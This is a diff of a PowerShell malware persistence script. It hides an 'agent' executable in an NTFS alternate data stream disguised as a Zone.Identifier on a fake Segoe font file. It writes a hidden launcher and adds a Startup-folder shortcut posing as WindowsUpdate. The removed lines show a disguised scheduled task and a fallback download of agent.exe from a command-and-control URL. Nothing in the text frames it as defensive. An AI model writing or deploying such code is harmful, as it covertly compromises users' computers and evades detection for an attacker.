@@ -7,95 +7,76 @@ if (-not $agentPath) {
 }
 
 # ============================================================
-# 1. Permanent folder in LocalAppData\Microsoft\Windows\Fonts
+# 1. Create a fake font file in the Fonts folder
 # ============================================================
-$permDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
-if (-not (Test-Path $permDir)) {
-    New-Item -ItemType Directory -Path $permDir -Force | Out-Null
-    attrib +h $permDir   # hide the folder
+$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
+if (-not (Test-Path $fontDir)) {
+    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
+    attrib +h $fontDir
+    Write-Output "[+] Created hidden fonts folder"
 }
-$scriptPath = "$permDir\run.ps1"
-$carrierFile = "C:\Windows\Temp\~DF539A.tmp"
-$streamName = "thumbs.db"
-$c2BaseUrl = "https://c2-serverv2-qxvl.onrender.com"  # replace with your actual C2
+
+# Create a fake font file that looks legitimate
+$fontFile = "$fontDir\seguibl.ttf"  # Segoe UI Bold – common Windows font
+if (-not (Test-Path $fontFile)) {
+    # Create a tiny fake font file (just enough to look real)
+    $fakeFontContent = @"
+TTF fake font file – do not delete
+This is a placeholder that mimics a real font file.
+Windows may use this directory for user-installed fonts.
+"@
+    Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
+    attrib +h $fontFile
+    Write-Output "[+] Created fake font file: $fontFile"
+} else {
+    Write-Output "[+] Using existing font file: $fontFile"
+}
 
 # ============================================================
-# 2. Hide the agent in an ADS (backup)
+# 2. Hide the agent in an ADS attached to the font file
 # ============================================================
+$streamName = "Zone.Identifier"  # Looks like a legitimate security zone marker
+Write-Output "[+] Hiding agent in ADS: $fontFile`:$streamName"
 $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
-Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
-$hiddenPath = "$carrierFile`:$streamName"
+Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
+$hiddenPath = "$fontFile`:$streamName"
 
 # ============================================================
-# 3. Create the extraction script (run.ps1) in the permanent folder
+# 3. Create launcher script in the same folder
 # ============================================================
-$extractCode = @"
-`$carrierFile = '$carrierFile'
+$launcherPath = "$fontDir\run.ps1"
+$launcherContent = @"
+`$fontFile = '$fontFile'
 `$streamName = '$streamName'
-`$agentUrl = '$c2BaseUrl/agent.exe'
 `$tempAgent = "`$env:TEMP\agent.exe"
 
-# Try to extract from carrier
-if (Test-Path `$carrierFile) {
-    `$bytes = Get-Content -Path `$carrierFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
-    if (`$bytes) {
-        [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
-        Start-Process -WindowStyle Hidden `$tempAgent
-        exit
-    }
-}
-
-# Fallback: download fresh agent
-try {
-    Invoke-WebRequest -Uri `$agentUrl -OutFile `$tempAgent -ErrorAction Stop
-} catch {
-    exit
-}
-
-# Recreate carrier file with hidden agent for next boot
-if (Test-Path `$tempAgent) {
-    `$newBytes = [System.IO.File]::ReadAllBytes(`$tempAgent)
-    if (-not (Test-Path `$carrierFile)) {
-        Set-Content -Path `$carrierFile -Value "[Temp File]" -Encoding ASCII
-    }
-    Set-Content -Path `$carrierFile -Stream `$streamName -Value `$newBytes -Encoding Byte
+# Extract agent from ADS
+`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
+if (`$bytes) {
+    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
     Start-Process -WindowStyle Hidden `$tempAgent
 }
 "@
-
-Set-Content -Path $scriptPath -Value $extractCode -Encoding ASCII -Force
-attrib +h $scriptPath   # hide the script too
+Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
+attrib +h $launcherPath
+Write-Output "[+] Created launcher: $launcherPath"
 
 # ============================================================
-# 4. Create/update scheduled task to run the permanent script
+# 4. Create shortcut in Startup folder
 # ============================================================
-$taskName = "WindowsUpdaterTask"
-$taskCommand = "powershell.exe -WindowStyle Hidden -File `"$scriptPath`""
+$startupFolder = [Environment]::GetFolderPath('Startup')
+$shortcutPath = "$startupFolder\WindowsUpdate.lnk"
 
-# Use COM to create task (no admin, no password prompt)
-try {
-    $taskService = New-Object -ComObject Schedule.Service
-    $taskService.Connect()
-    $rootFolder = $taskService.GetFolder("\")
-    try { $rootFolder.DeleteTask($taskName, 0) } catch { }
-
-    $taskDefinition = $taskService.NewTask(0)
-    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
-    $taskDefinition.Principal.UserId = $env:USERNAME
-    $taskDefinition.Principal.LogonType = 3
-    $trigger = $taskDefinition.Triggers.Create(9)
-    $trigger.UserId = $env:USERNAME
-    $action = $taskDefinition.Actions.Create(0)
-    $action.Path = "powershell.exe"
-    $action.Arguments = "-WindowStyle Hidden -File `"$scriptPath`""
-    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
-    Write-Output "[+] Scheduled task '$taskName' created/updated."
-} catch {
-    Write-Output "[-] Failed to create scheduled task: $_"
-}
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-WindowStyle Hidden -File `"$launcherPath`""
+$shortcut.WorkingDirectory = $fontDir
+$shortcut.Save()
+Write-Output "[+] Created startup shortcut: $shortcutPath"
 
 Write-Output ""
 Write-Output "✅ PERSISTENCE COMPLETE"
-Write-Output "Script location: $scriptPath"
 Write-Output "Agent hidden in: $hiddenPath"
-Write-Output "The scheduled task will run the script from the permanent folder on next logon."
+Write-Output "Font file carrier: $fontFile"
+Write-Output "Agent will run at next logon via Startup folder."
